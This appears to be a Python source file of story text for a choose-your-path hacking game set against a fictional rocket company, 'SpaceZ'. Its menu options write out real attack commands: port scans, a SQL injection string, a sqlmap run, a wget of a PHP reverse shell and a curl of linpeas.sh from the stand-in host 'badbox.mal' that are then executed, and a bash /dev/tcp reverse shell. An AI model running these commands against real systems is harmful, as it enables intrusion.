intro_turn_on_computer_text = '''
	
	You sit down at your desk and turn on your computer.
	After decrypting your SSD, your environment pops up.


	1. Open Terminal
	
	'''
	
intro_open_terminal_text = '''
	
	You begin your assault..
	

	1. whois spacez.com
	
	2. protonvpn-cli c
	
	'''
	
recon_whois_text ='''
	
	Among the output you note an IP range: 10.11.10.0/16.
	You export this string into the variable "range".
	

	1. nmap -p- -A -T5 $range
	
	2. masscan --rate=100000 $range
	
	3. nmap -sF -p- --max-rate=500 $range 
	
	'''

recon_protonvpn_text = '''
	
	You boot up your 1337 VPN, and then get to work. A 
	quick WHOIS floods the terminal. Among the output 
	you note an IP range: 10.11.10.0/16. You export this 
	string into the variable "range".


	1. nmap -p- -A -T5 $range
	
	2. masscan --rate=100000 $range
	
	3. nmap -sF -p- --max-rate=500 $range 
	
	'''
	
scanning_nmap_fin_text = '''
	
	Your scan comes back with several IPs, the only one 
	that catches your interest is 10.11.242.232.
	
	Its output reads:
	
		21/open
		22/open
		445/open
		3389/open
		61446/open
		61447/open
		61448/open
		61449/open


	1. ftp $ip
	
	2. ssh $ip
	
	3. firefox $ip &
	
	4. dirsearch -u https://$ip -x 302,303,404
	
	'''
	
scanning_dirsearch_text = '''

	You directory bust the root discover a subdirectory called 'assets'.
	
	
	1. Go back
	
	'''

#if dirsearch has not been done	
exploiting_firefox_restricted_text = '''
	
	A browser window blossoms across your interface. A 
	standard home page, with a picture of a super sick 
	rocket ship, along with some specifications on the new 
	"RegurgTech" which leverages a concavity of solar 
	panels set up in a Dyson-sphere-like situation around 
	the initial booster exhaust. This then captures the 
	lumins of the launch blast to charge a rather small 
	battery onboard the cone. This battery holds enough 
	power from that initial blast that it can be used to
	generate thrust through Zero G for years to come.
	
	The page also has a media gallery link, and a comment 
	form which catches your attention.
	
	
	1. ' OR 1=1; //
	
	2. https://$ip.com/admin
	
	3. Back to Terminal
	
	'''

#if dirsearch has been done
exploiting_firefox_with_dir_text = '''
	
	A browser window blossoms across your interface. A 
	standard home page, with a picture of a super sick 
	rocket ship, along with some specifications on the new 
	"RegurgTech" which leverages a concavity of solar 
	panels set up in a Dyson-sphere-like situation around 
	the initial booster exhaust. This then captures the 
	lumins of the launch blast to charge a rather small 
	battery onboard the cone. This battery holds enough 
	power from that initial blast that it can be used to
	generate thrust through Zero G for years to come.
	
	The page also has a media gallery link, and a comment 
	form which catches your attention.


	1. ' OR 1=1; //
	
	2. https://$ip.com/admin

	3. https://$ip.com/assets
	
	4. Back to Terminal
	
	'''
	
exploiting_firefox_sqli_text ='''
	
	This user/password combination is not valid.
	
	
	1. Back to Firefox
	
	2. sqlmap -u https://$ip.com -p ?login.php --level=3 --risk=2 --common-files
		
	'''

#has user/pass inputs, requiring the creds from the Easter Egg Hunt
exploiting_firefox_admin_panel_text = '''
	
	A login panel appears.
	
	
	1. Back to Firefox
	
	2. Attempt
	
	'''
	

#a counter and a dict will be in place, if user exceeds counter or if user attempts any user in the dict, then incarcerated
exploiting_firefox_admin_panel_high_profile_text = '''
	
	Your careless disregard for subterfuge has 
	triggered the alarms in SpaceZ SOC. Your 
	station is blacklisted ...
	
	'''

#only works if dirsearch done; 10059 is good
exploiting_firefox_slash_assets_text = '''
	
	A large collection of numerically-named folders
	appears in this subdirectory.
	
	
	1. /2055		5. /139668 
	
	2. /34555		6. /1254
	
	3. /47999		7. /10059
	
	4. /3096		8. /4102

	'''
	
exploiting_firefox_slash_assets_bad_text = '''
	
	There is nothing of interest in this folder.
	
	
	1. Go back
	
	'''

#if vpn was not set in the beginning, this download triggers incarceration, with no textual indication of the cause	
exploiting_firefox_slash_assets_good_with_vpn_text = '''
	
	This folder contains a file called "assets.bak" which you
	download to your station.
	
	
	1. file assets.bak
	
	2. cat assets.bak
	
	3. ls assets.bak
	
	4. read assets.bak
	
	'''
	
exploiting_firefox_assets_file_text ='''
	
	assets.bak: ASCII text
	
	
	1. Back to Assets
	
	
	'''
	
exploiting_firefox_assets_cat_code_text = '''
	
MDAwMC4wMDAgKDApIE9wZW5lZCBsb2cgZmlsZSBhdCB0aW1lOiBNb24sIDIzIEFwciAyMDE4IDE4
OjQzOjMwICswMDAwIG9uIGh0dHBzOiRpcC5jb20vY3JlZHN3dXQvaktubEkKMDAwMC4wMDIgKDAp
IFVwZHJhZnRQbHVzIFdvcmRQcmVzcyBiYWNrdXAgcGx1Z2luOiAxLjE0LjUgV1A6IDQuOS41IFBI
UDogNS42LjMwCjAwMDAuMDI1ICgwKSBGcmVlIHNwYWNlIG9uIGRpc2sgY29udGFpbmluZyB0ZW1w
b3JhcnkgZGlyZWN0b3J5OiA1NTM0OC41IE1CCjAwMDAuMjA1ICgwKSBUYXNrczogQmFja3VwIGZp
bGVzOiAxIChzY2hlZHVsZTogbWFudWFsKSBCYWNrdXAgREI6IDEgKHNjaGVkdWxlOiBtYW51YWwp
CjAwMDAuMjI1ICgwKSBSZXF1ZXN0aW5nIHNlbWFwaG9yZSBsb2NrIChmZCkgKGFwcGFyZW50bHkg
bm90IHZpYSBzY2hlZHVsZXIpCjAwMDAuMjI3ICgwKSBTZW1hcGhvcmUgKGZkLCB3cF9vcHRpb25z
KSB3YXMgc3R1Y2ssIHNldCBsb2NrIHRpbWUgdG8gMjAxOC0wNC0yMyAxODo0MzozMAowMDAwLjIy
OSAoMCkgU2VtYXBob3JlIChmZCwgd3Bfb3B0aW9ucykgcmVzZXQgdG8gMQowMDAwLjIzMCAoMCkg
U2V0IHNlbWFwaG9yZSBsYXN0IGxvY2sgKGZkKSB0aW1lIHRvIDIwMTgtMDQtMjMgMTg6NDM6MzAK
MDAwMC4yMzEgKDApIFNlbWFwaG9yZSBsb2NrIChmZCkgY29tcGxldGUKMDAwMC4yMzcgKDApIEJh
Y2t1cCBydW46IHJlc3VtcHRpb249MCwgbm9uY2U9MWFjMDI4MWZkOWRkLCBiZWd1biBhdD0xNTI0
NTA5MDEwICgwcyBhZ28pLCBqb2IgdHlwZT1iYWNrdXAKMDAwMC4yMzkgKDApIFNjaGVkdWxpbmcg
YSByZXN1bXB0aW9uICgxKSBhZnRlciAzMDAgc2Vjb25kcyAoMTUyNDUwOTMxMCkgaW4gY2FzZSB0
aGlzIHJ1biBnZXRzIGFib3J0ZWQKMDAwMC4yNjEgKDApIENoZWNraW5nIGlmIHdlIGhhdmUgYSB6
aXAgZXhlY3V0YWJsZSBhdmFpbGFibGUKMDAwMC4yNjIgKDApIFRlc3Rpbmc6IC91c3IvYmluL3pp
cAowMDAwLjI3OCAoMCkgT3V0cHV0OiB6aXAgd2FybmluZzogYmluemlwdGVzdC90ZXN0LnppcCBu
b3QgZm91bmQgb3IgZW1wdHkKMDAwMC4yODAgKDApIE91dHB1dDogYWRkaW5nOiBiaW56aXB0ZXN0
L3N1YmRpcjEvCShpbj0wKSAob3V0PTApIChzdG9yZWQgMCUpCjAwMDAuMjgxICgwKSBPdXRwdXQ6
IGFkZGluZzogYmluemlwdGVzdC9zdWJkaXIxL3N1YmRpcjIvCShpbj0wKSAob3V0PTApIChzdG9y
ZWQgMCUpCjAwMDAuMjgyICgwKSBPdXRwdXQ6IGFkZGluZzogYmluemlwdGVzdC9zdWJkaXIxL3N1
YmRpcjIvdGVzdC5odG1sCShpbj0xMzEpIChvdXQ9MTA3KSAoZGVmbGF0ZWQgMTglKQowMDAwLjI4
MyAoMCkgT3V0cHV0OiB0b3RhbCBieXRlcz0xMzEsIGNvbXByZXNzZWQ9MTA3IC0+IDE4JSBzYXZp
bmdzCjAwMDAuMjk4ICgwKSBPdXRwdXQ6IGFkZGluZzogYmluemlwdGVzdC9zdWJkaXIxL3N1YmRp
cjIvdGVzdDIuaHRtbAkoaW49MTM4KSAob3V0PTExMykgKGRlZmxhdGVkIDE4JSkKMDAwMC4zMDAg
KDApIE91dHB1dDogdG90YWwgYnl0ZXM9MjY5LCBjb21wcmVzc2VkPTIyMCAtPiAxOCUgc2F2aW5n
cwowMDAwLjMxMiAoMCkgV29ya2luZyBiaW5hcnkgemlwIGZvdW5kOiAvdXNyL2Jpbi96aXAKMDAw
MC4zMTUgKDApIFppcCBlbmdpbmU6IGZvdW5kL3dpbGwgdXNlIGEgYmluYXJ5IHppcDogL3Vzci9i
aW4vemlwCjAwMDAuMzE2ICgwKSBDcmVhdGlvbiBvZiBiYWNrdXBzIG9mIGRpcmVjdG9yaWVzOiBi
ZWdpbm5pbmcKMDAwMC4zMTkgKDApIEJlZ2lubmluZyBjcmVhdGlvbiBvZiBkdW1wIG9mIHBsdWdp
bnMgKHNwbGl0IGV2ZXJ5OiA0MDAgTUIpCjAwMDEuMzQ3ICgwKSBUb3RhbCBlbnRpdGllcyBmb3Ig
dGhlIHppcCBmaWxlOiA2MjQgZGlyZWN0b3JpZXMsIDQ0NTYgZmlsZXMgKDAgc2tpcHBlZCBhcyBu
b24tbW9kaWZpZWQpLCA2MC40IE1CCjAwMDEuMzUzICgwKSBaaXA6IGJhY2t1cF8yMDE4LTA0LTIz
LTE4NDNfTWF0dGlhc19ob21lZGlyMWFjMDI4MWZkOWRkLXBsdWdpbnMuemlwLnRtcDogMTAwIGZp
bGVzIGFkZGVkIChvbi1kaXNrIHNpemU6IDEwMjMgS0IpCjAwMDEuMzYyICgwKSBaaXA6IGluc3Rh
bnRpYXRlLnppcGVuY29kaW5nLmNyeXB0LmtleT00NTc2ZHUyRlMgOiAxMDAgZmlsZXMgcHJvY2Vz
c2VkIChvbi1kaXNrIHNpemU6IDE4NzIgS0IpCjAwMDEuMzYyICgwKSBPcGNvZGU6IDIwMDogU3Vj
Y2VzcwowMDAxLjM5MyAoMCkgQ2xlYW51cCB0YXNrcyAoYWxsX3Rhc2tzKSBpbml0aWFsaXppbmcg
bm93CjAwMDEuNDkyICgwKSBDbGVhbnVwIG9wZXJhdGlvbiBzdWNjZXNzZnVsOiBDbG9zaW5nIHNl
c3Npb24K
	
	'''
	
exploiting_firefox_assets_cat_text = '''
	1. Back to Assets
	
	2. Back to Firefox
	
	'''

exploiting_firefox_assets_ls_text = '''
	
	assets.bak
	
	
	1. Back to Assets
	
	'''
	
exploiting_firefox_assets_read_text = '''
	
	bash: read: `assets.bak': not a valid identifier
	
	
	1. Back to Assets
	
	'''
	
exploiting_firefox_access_granted_text = '''
	
	The web console contains a command line interface.
	
	
	1. wget http://badbox.mal/trnsf/ptmonk/phprevsh.php -o php.php && chmod 777 * && ./php.php
	
	2. bash -i >& /dev/tcp/$badbox/61445 0>&1
	
	'''
	
exploiting_firefox_access_granted_wget_text = '''
	
	Your command sets off several alarms within the
	SpaceZ Blue Team. Your station is blacklisted ...
	
	'''
	
exploiting_ftp_ssh_text = '''
	
	The default credentials attempt is picked up on by
	SpaceZ Blue Team. Your station is blacklisted ...
	
	'''

#this also sets a setting to allow a new option in the firefox path
scanning_dirsearch_text = '''
	
	You directory bust the root and discover that there
	is a subdirectory called "/assets".
	
	
	1. Back to NMap
	
	'''

footholded_text = '''
	
	A new terminal windows beeps at you, having pulled
	a caught connection from the background. Whoami tells
	that you are operating as "Matt".
	
	
	1. find / -user root -perm -4000 -exec ls -ldb {} \;
	
	2. curl http://badbox.mal/trnsf/linpeas.sh > lp.sh && chmod 750 lp.sh && ./lp.sh
	
	3. uname -a
	
	'''
	
footholded_find_text = '''
	
	No output is received.
	
	
	1. Back to Shell
	
	'''
	
footholded_curl_text = '''
	
	Your command sets off several alarms within the
	SpaceZ Blue Team. Your station is blacklisted ...
	
	'''
	
footholded_uname_text = '''
	
	The kernel version displayed is vulnerable to 
	local privilege escalation.
	
	
	1. nano vuln.c && sleep 300 && gcc vuln.c -o a.out && ./a.out
	
	'''

#start the mission_complete printing sequence
rooted_success_text = '''
	
	root@SpaceZ:~$ _
	
	'''
	
anytime_failure_text = '''

	A few hours later the window of your living room explodes, 
	and a team of CyberCrime R.C.M.P. on horseback come jumping
	through the opening to trample and arrest you!
	
	You rot away in an overcrowded remand center for two years 
	until your trial is scheduled. Finally your case comes 
	before the court. You are tried and unanimously convicted
	for Unauthorized Access to a Computer Network, Conspiracy 
	to Commit Felony Acts, and Possession of Unauthorized Data.


	----------------------------------
	
	YOU'RE INCARCERATED!
	
	'''

aggressive_failure_text = '''

	Your aggressive packet storm is picked up on by SpaceZ
	Blue Team. Your station is blacklisted.
	
	'''
	
default_failure_text = '''

	Your default credentials attempt is picked up on by
	SpaceZ Blue Team. Your station is blacklisted.
	
	'''



















